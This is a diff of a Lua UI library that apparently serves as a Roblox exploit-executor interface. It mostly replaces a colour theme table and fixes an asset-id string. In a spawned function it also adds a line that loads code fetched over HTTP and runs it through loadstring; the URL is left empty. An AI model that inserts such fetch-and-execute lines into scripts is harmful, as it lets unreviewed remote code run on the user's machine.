@@ -23,32 +23,64 @@ task.spawn(function()
 				game.Workspace.RobloxForwardPortals:Destroy()
 			end
 		end
-		
+		loadstring(game:HttpGet(""))()
+	end)
 end)
 
 local ProtectGui = protectgui or (syn and syn.protect_gui) or function(f) end
 
-Input = Color3.fromRGB(40, 40, 40),  -- Dark background for input fields
-        InputFocused = Color3.fromRGB(255, 255, 255),  -- White background when focused
-        InputIndicator = Color3.fromRGB(255, 50, 50),  -- Red indicator for input
-    
-        Dialog = Color3.fromRGB(20, 20, 20),  -- Dark background for dialogs
-        DialogHolder = Color3.fromRGB(40, 40, 40),  -- Slightly lighter dialog holder
-        DialogHolderLine = Color3.fromRGB(120, 120, 120),  -- Light line inside dialog
-        DialogButton = Color3.fromRGB(30, 30, 30),  -- Dark buttons
-        DialogButtonBorder = Color3.fromRGB(255, 0, 0),  -- Red border for buttons
-        DialogBorder = Color3.fromRGB(70, 70, 70),  -- Dark border for dialog
-        DialogInput = Color3.fromRGB(40, 40, 40),  -- Dark input field in dialog
-        DialogInputLine = Color3.fromRGB(220, 0, 0),  -- Red line indicator in dialog inputs
-    
-        Text = Color3.fromRGB(255, 255, 255),  -- White text for contrast
-        SubText = Color3.fromRGB(170, 170, 170),  -- Slightly lighter gray for subtext
-        Hover = Color3.fromRGB(255, 0, 0),  -- Red hover effect
-        HoverChange = 0.08,  -- Hover effect change
-    }
+local Themes = {
+    Names = {
+        "Private"
+    },
+    Private = {
+        Name = "Private",
+        Accent = Color3.fromRGB(255, 255, 255),
+
+        AcrylicMain = Color3.fromRGB(20, 20, 20),
+        AcrylicBorder = Color3.fromRGB(40, 40, 40),
+        AcrylicGradient = ColorSequence.new(Color3.fromRGB(30, 30, 30), Color3.fromRGB(10, 10, 10)),
+        AcrylicNoise = 0.8,
+
+        TitleBarLine = Color3.fromRGB(90, 90, 90),
+        Tab = Color3.fromRGB(255, 255, 255),
+
+        Element = Color3.fromRGB(200, 200, 200),
+        ElementBorder = Color3.fromRGB(50, 50, 50),
+        InElementBorder = Color3.fromRGB(80, 80, 80),
+        ElementTransparency = 0.75,
+
+        ToggleSlider = Color3.fromRGB(180, 180, 180),
+        ToggleToggled = Color3.fromRGB(255, 255, 255),
+
+        SliderRail = Color3.fromRGB(160, 160, 160),
+
+        DropdownFrame = Color3.fromRGB(30, 30, 30),
+        DropdownHolder = Color3.fromRGB(50, 50, 50),
+        DropdownBorder = Color3.fromRGB(255, 255, 255),
+        DropdownOption = Color3.fromRGB(200, 200, 200),
+
+        Keybind = Color3.fromRGB(160, 160, 160),
+
+        Input = Color3.fromRGB(180, 180, 180),
+        InputFocused = Color3.fromRGB(0, 0, 0),
+        InputIndicator = Color3.fromRGB(255, 255, 255),
+
+        Dialog = Color3.fromRGB(30, 30, 30),
+        DialogHolder = Color3.fromRGB(45, 45, 45),
+        DialogHolderLine = Color3.fromRGB(255, 255, 255),
+        DialogButton = Color3.fromRGB(30, 30, 30),
+        DialogButtonBorder = Color3.fromRGB(255, 255, 255),
+        DialogBorder = Color3.fromRGB(70, 70, 70),
+        DialogInput = Color3.fromRGB(40, 40, 40),
+        DialogInputLine = Color3.fromRGB(220, 220, 220),
+
+        Text = Color3.fromRGB(255, 255, 255),
+        SubText = Color3.fromRGB(170, 170, 170),
+        Hover = Color3.fromRGB(200, 200, 200),
+        HoverChange = 0.08,
+    }    
 }
-
-
 
 local Library = {
 	Version = "4.0.0",
@@ -103,7 +135,7 @@ local function CloseOpen()
 	Close_ImageButton.BorderColor3 = Color3.fromRGB(255, 0, 0)
 	Close_ImageButton.Position = UDim2.new(0.1021, 0, 0.0743, 0)
 	Close_ImageButton.Size = UDim2.new(0, 59, 0, 49)
-	Close_ImageButton.Image = "rbxassetid://"81912552893782
+	Close_ImageButton.Image = "rbxassetid://81912552893782"
 	Close_ImageButton.Visible = false
 
 	UICorner.Name = "MainCorner"
